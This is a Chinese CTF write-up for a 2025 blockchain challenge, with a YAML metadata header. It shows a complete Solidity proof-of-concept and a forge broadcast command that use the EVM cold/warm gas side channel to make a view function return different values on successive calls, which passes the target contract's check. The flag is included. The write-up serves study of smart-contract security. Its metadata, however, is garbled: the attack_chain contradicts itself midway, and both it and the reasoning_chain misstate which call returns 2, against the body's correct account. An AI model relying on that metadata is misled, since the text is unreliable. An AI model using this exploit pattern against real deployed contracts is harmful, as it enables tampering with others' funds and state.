---
title: 封神台CTF blockchain 美梦成真
contest: 封神台CTF
year: 2025
difficulty: medium
vuln_type: misc_unknown
tags:
- blockchain
- Solidity
- EVM
- cold-warm-access
- gas-measurement
- wish_making
- foundry
- view-function
- ChaMd5
attack_chain:
- 目标合约 wish_making 调用 msg.sender.wish_amount()（view 函数）决定 wishes[tx.origin] 是赋值还是 -1
- is_solved 要求 wishes[tx.origin] > 1
- 第一次 wish_amount < 1 → is_less_than=true → wishes = wish_amount
- 第二次 wish_amount >= 1 → is_less_than=false → wishes = wishes - 1
- 关键：view 函数无法修改状态，但 EVM 冷读/热读 gas 差异可被测信道利用
- 攻击合约 wish_amount 用 startGas - gasleft() 测自身消耗 gas
- 访问 address(0x100).balance 触发冷读消耗 2600 gas（vs 热读 100）
- 第二次访问时已变热读，消耗仅 100，usedGas < 1000 → 返回 2
- wish_making 调用：wish_amount=2 → is_less_than=false → wishes = wishes-1
- 但这是"第一次调用 wish_amount"，所以 is_less_than 判断用 wish_amount=2 → 实际执行 wishes = wish_amount
- 等等，逻辑是 if(2 < 1) is_less_than=true; else wishes = wishes-1
- 实际是 wishes[tx.origin] = wish_amount()，即 wishes = 2
- is_solved 验证 wishes[tx.origin] > 1 = 2 > 1 = true
key_payload: '''wish_amount() { uint256 start = gasleft(); address(0x100).balance; if (start - gasleft() < 1000) return 2; return 0; }'''
one_liner: EVM 冷读/热读 gas 差异作为侧信道让 view 函数在不同调用返回不同值，绕过 wish_making 校验。
lesson: Solidity view 函数虽不能修改状态，但 gasleft() + cold/warm access 是隐蔽的"状态"维度，可作为侧信道被滥用。
quality: high
full_path: 封神台CTF_blockchain_美梦成真.full.md
meta_path: 封神台CTF_blockchain_美梦成真.meta.md
images_removed: true
images_removed_count: 3
schema_version: v3.0.0-P0
summary: 封神台CTF blockchain 美梦成真。EVM 冷读/热读 gas 差异作为侧信道让 view 函数在不同调用返回不同值，绕过 wish_making 校验。。关键路径：目标合约 wish_making 调用 msg.sender.wish_amount()（view 函数）决定 wishes[tx.origin] 是赋值还是 -1 → is_solved 要求 wishes[tx.o...
category: misc
subcategory: misc_other
tools_used:
- Solidity
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 3
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/222685.html
reasoning_chain:
- 封神台 blockchain 美梦成真：Solidity view 函数 + gasleft() + 冷/热访问侧信道 → 触发点：EVM 冷读 2600 gas vs 热读 100 gas
- 目标合约 wish_making 调用 msg.sender.wish_amount()（view 函数）决定 wishes[tx.origin] 是赋值还是 -1 → 假设：view 函数无法修改状态但 EVM 冷读/热读 gas 差异可被测信道
- 攻击合约 wish_amount 用 startGas - gasleft() 测自身消耗 gas → 假设：第一次访问 address(0x100).balance 触发冷读消耗 2600 gas → 动作：访问后下次访问是热读只消耗 100
- 观察：usedGas < 1000 时返回 2（不同返回值侧信道编码）
- wish_making 调用：wish_amount=2 → is_less_than=false → wishes = wish_amount = 2
- 观察：is_solved 验证 wishes[tx.origin] > 1 = 2 > 1 = true → 通过
failed_attempts:
- 试图直接构造 wishes[tx.origin] = 2 → 失败：合约逻辑不允许外部写入
- 用 storage 写入 → 失败：view 函数禁止
- 试图 fallback 函数拦截 → 失败：fallback 仅在 msg.data 为空时触发
key_observations:
- Solidity view 函数虽不能修改状态，但 gasleft() + cold/warm access 是隐蔽的'状态'维度，可作为侧信道
- EIP-2929 cold/warm 访问成本差 2600-100 = 隐蔽的'内存'状态
- msg.sender.wish_amount() 是攻击者部署的合约，可自定义返回值
- wish_making.call(wish_amount) 直接执行 msg.sender 上的函数，无 reentrancy guard
prerequisites:
- Solidity 0.8 合约编写与部署
- EVM cold/warm access 机制（EIP-2929 / EIP-3529）
- Foundry/Hardhat 调试与 test
- view/pure 函数与 gasleft() 测信道
---
# 封神台CTF blockchain 美梦成真

> 原文: https://www.ctfiot.com/222685.html
> ID: 222685

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组)

分析：这道题的合约放在了 Sepolia 测试网上，要进行交互，首先要调用 start_challenge()函数，有点像是使用 EOA 账户来开启容器的味道了。

要想 is_solved 函数返回 true 这里要求我们 EOA 对应的wishes mapping的值大于 1。要想修改 wishes 只能通过wish_making函数。调用该函数时会自动调用msg.sender上的wish_amount函数。

function wish_making() external challenge_started remains_wish {
 Wish_Maker wish_maker = Wish_Maker(msg.sender);
 bool is_less_than = false;
 if (wish_maker.wish_amount() < 1) {
 is_less_than = true;
 }
 wish_made[tx.origin] = true;
 if (is_less_than) {
 wishes[tx.origin] = wish_maker.wish_amount();
 } else {
 wishes[tx.origin]--;
 }
}

要想满足 is_solved 的条件，我们需要当 target 第一次调用我们攻击合约的 wish_amount 时，第一次返回的是 0，第二次返回的值大于 1。但是，由于接口的定义，wish_amount函数是一个 view 函数。通过常规的方法无法修改，但是我们可以利用 evm 冷读热的的特点进行绕过

当第一次访问一个地址时，这个地址是冷读，消耗的 gas 为 2600，但是第二次访问这个地址时，就变成了热读，消耗的 gas 仅有 100。所以我们可以对攻击合约中的 wish_amount 函数进行如下构造：

function wish_amount() external view returns (uint256) {
	uint256 startGas = gasleft();
	uint256 bal = address(0x100).balance;
	uint256 usedGas = startGas - gasleft();
	if (usedGas < 1000) {
 return 2;
	}
	return 0;
}

完整 Poc

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Make_a_wish} from "../src/Make_a_wish.sol";
import {Wish_Maker} from "../src/Make_a_wish.sol";

contract Poc is Wish_Maker {
 function wish_amount() external view returns (uint256) {
 uint256 startGas = gasleft();
 uint256 bal = address(0x100).balance;
 uint256 usedGas = startGas - gasleft();
 if (usedGas < 1000) {
 return 2;
 }
 return 0;
 }

 function attack() external {
 Make_a_wish target = Make_a_wish(0xFD8fa72956172C671cA3cc5c84f38f0C98CEEa61);
 target.start_challenge();
 target.wish_making();
 require(target.is_solved(address(tx.origin)), "hack failed");
 }
}

contract Attack is Script {
 function run() public {
 vm.startBroadcast();
 Poc poc = new Poc();
 poc.attack();
 vm.stopBroadcast();
 }
}

执行 foundry 命令即可：

forge script script/Attack.s.sol --rpc-url $rpc --private-key $key --tc Attack --broadcast --evm-version cancun

account：0xDf996e6b09A5f1dc4da8365148e7e8D52e8fD892

flag：flag{v1ew_K3yword_7rouble}

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
function wish_making() external challenge_started remains_wish {
 Wish_Maker wish_maker = Wish_Maker(msg.sender);
 bool is_less_than = false;
 if (wish_maker.wish_amount() < 1) {
 is_less_than = true;
 }
 wish_made[tx.origin] = true;
 if (is_less_than) {
 wishes[tx.origin] = wish_maker.wish_amount();
 } else {
 wishes[tx.origin]--;
 }
}
function wish_amount() external view returns (uint256) {
	uint256 startGas = gasleft();
	uint256 bal = address(0x100).balance;
	uint256 usedGas = startGas - gasleft();
	if (usedGas < 1000) {
 return 2;
	}
	return 0;
}
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Make_a_wish} from "../src/Make_a_wish.sol";
import {Wish_Maker} from "../src/Make_a_wish.sol";

contract Poc is Wish_Maker {
 function wish_amount() external view returns (uint256) {
 uint256 startGas = gasleft();
 uint256 bal = address(0x100).balance;
 uint256 usedGas = startGas - gasleft();
 if (usedGas < 1000) {
 return 2;
 }
 return 0;
 }

 function attack() external {
 Make_a_wish target = Make_a_wish(0xFD8fa72956172C671cA3cc5c84f38f0C98CEEa61);
 target.start_challenge();
 target.wish_making();
 require(target.is_solved(address(tx.origin)), "hack failed");
 }
}

contract Attack is Script {
 function run() public {
 vm.startBroadcast();
 Poc poc = new Poc();
 poc.attack();
 vm.stopBroadcast();
 }
}
forge script script/Attack.s.sol --rpc-url $rpc --private-key $key --tc Attack --broadcast --evm-version cancun
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]